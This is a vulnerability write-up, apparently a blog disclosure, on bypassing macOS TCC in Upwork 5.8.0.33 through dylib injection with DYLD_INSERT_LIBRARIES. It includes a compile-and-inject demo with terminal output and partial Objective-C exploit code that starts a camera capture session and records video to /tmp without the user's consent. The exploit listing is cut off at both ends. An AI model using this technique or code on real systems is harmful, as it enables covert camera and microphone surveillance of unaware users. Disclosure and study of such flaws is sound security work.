title:  "NO-CVE: Upwork 5.8.0.33 TCC Bypass Through Hardened Runtime Bypass"
layout: post
categories: macOS
---

It was possible for an attacker to load an unsigned malicious dylib into the `/Applications/Upwork.app/Contents/MacOS/Upwork` Mach-O and inherit entitlements which allowed for unsolicited acamer and microphone recordings. This facilitated a low-privilege user to record from the camera and the microphone without requiring a user's permission. 



## Business Impact
TCC Bypasses can result in the following business impact:
- Privacy Violation: Without proper user consent, an attacker could abuse an application with a TCC bypass to eavesdrop on users' conversations, record their activities, and collect sensitive personal information without their knowledge or authorization.
- Reputational Damage: The developer's reputation could be tarnished if the vulnerability is publicly disclosed and the developer fails to take prompt and effective action to address it.
- Loss of Business Opportunities: Developers may face difficulty attracting new customers or partnerships if they are known for releasing insecure applications that facilitate violation of user privacy.

## Overview of Exploitation

### Transparency, Consent, and Control (TCC) 
On macOS, `TCC` (also known as Privacy preferences) is a security framework that helps protect user privacy by granting applications access to sensitive resources only when the user explicitly permits it. `TCC` is part of macOS' `"rootless"` privacy model which requires a user to grant explicit user authorization to applications which request access to sensitive resources like the microphone, screen recording, and other privacy-related functionalities, this applies to the `root` user as well and is classed as a security boundary by apple.

During the application's use, it requests whether the user grants the application access to the camera and/or the microphone, this writes the preferences to the `TCC.db` and facilitates the app to use those system resources. If an unknown attacker were to try and use the camera and/or the microphone from e.g. `Attacker.app`, then a popup stating the requesting application's name would be presented to the user. However an app which has already requested and been granted these permissions won't have to request for each use as the permission has already been granted.


### Hardened Runtime, Entitlements & RPATH search order hijacks 
The Hardened Runtime, together with System Integrity Protection (SIP), safeguards software's runtime integrity by blocking common attack vectors like code injection, dynamically linked library (dylib) hijacking, and process memory space tampering. Despite the `/Applications/Upwork.app/Contents/MacOS/Upwork` Mach-O having a hardened runtime (`flags=0x10000(runtime)`), the `com.apple.security.cs.disable-library-validation` and `com.apple.security.cs.allow-dyld-environment-variables` entitlements allowed for the dyld to load unsigned libraries.

```

This could be abused by an attacker through preloading the application with an unsigned malicious dylib so that arbritrary code is running within the `/Applications/Upwork.app/Contents/MacOS/Upwork` Mach-O, thus inheriting its entitlements registered in the TCC database. 


The `com.apple.security.cs.allow-dyld-environment-variables` and `com.apple.security.cs.disable-library-validation` entitlements allow for an unsigned dylib to be loaded via the `DYLD_INSERT_LIBRARIES` environment variable. As an example, if the `/Applications/Upwork.app/Contents/MacOS/Upwork` Mach-O was preloaded with the `DYLD_INSERT_LIBRARIES` environment variable then dyld would load said unsigned malicious dylib.

This example can be demonstrated with the following following `dylib`
```objc
/* gcc -dynamiclib -framework Cocoa -framework Foundation runtime_tcc_bypass_demo.m -o runtime_tcc_bypass_demo.dylib */

#include <syslog.h>
#import <Foundation/Foundation.h>
#import <Cocoa/Cocoa.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    NSLog(@"[INFO] dylib constructor called from %s\n", argv[0]);
    syslog(LOG_ERR, "[INFO] dylib constructor called from %s\n", argv[0]);

    NSLog(@"[INFO] Exiting !");
    [[NSApplication sharedApplication] terminate:nil];   
}
```

This example can be seen below:
```
04:02:01-testmac@mpro:~/Desktop/UPWORK$ gcc -dynamiclib -framework Cocoa -framework Foundation runtime_tcc_bypass_demo.m -o runtime_tcc_bypass_demo.dylib
04:02:05-testmac@mpro:~/Desktop/UPWORK$ DYLD_INSERT_LIBRARIES=runtime_tcc_bypass_demo.dylib /Applications/Upwork.app/Contents/MacOS/Upwork 
2023-12-23 04:02:36.694 Upwork[1741:38078] [INFO] dylib constructor called from /Applications/Upwork.app/Contents/MacOS/Upwork
2023-12-23 04:02:36.695 Upwork[1741:38078] [INFO] Exiting !
```

## Exploitation
Since the target Mach-O object possessed the `com.apple.security.cs.disable-library-validation` and `com.apple.security.cs.allow-dyld-environment-variables` entitlements, an attacker could exploit this to inherit the `com.apple.security.device.microphone` and `com.apple.security.device.camera` entitlements, thereby circumventing the hardened runtime and `TCC` security measures in place. This will grant them the ability to carry out unauthorized recording of audio and video without user permission.

## Proof of Concept (PoC) Exploit Script / Code
This section contains the exploit code for the `go.sh` automated exploit script to work. The directory structure should be setup with the contents of the files listed as follows:
```
04:05:30-testmac@mpro:~/Desktop/UPWORK/exploit$ ls
total 24
drwxr-xr-x  4 testmac  staff   128B 23 Dec 04:05 .
drwxr-xr-x  5 testmac  staff   160B 23 Dec 04:04 ..
-rw-r--r--  1 testmac  staff   2.6K 23 Dec 04:05 upwork_runtime_bypass_tcc_bypass.m
-rw-r--r--  1 testmac  staff   5.5K 23 Dec 04:05 go.sh
```

### upwork_runtime_bypass_tcc_bypass.m
The following Objective-C exploit code was compiled into a dynamic library (dylib) to preload into `/Applications/Upwork.app/Contents/MacOS/Upwork` and capture a 3-second video recording without the users permission.

```objc

    }
    return self;
}

- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];

    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];

    if (error) {
        NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
        return;
    }

    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }

    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];

    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}

- (void)startRecording {
    [self.captureSession startRunning];
    NSURL *outputFileURL = [NSURL fileURLWithPath:@"/tmp/upwork_attacker.mov"];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}

- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}

#pragma mark - AVCaptureFileOutputRecordingDelegate
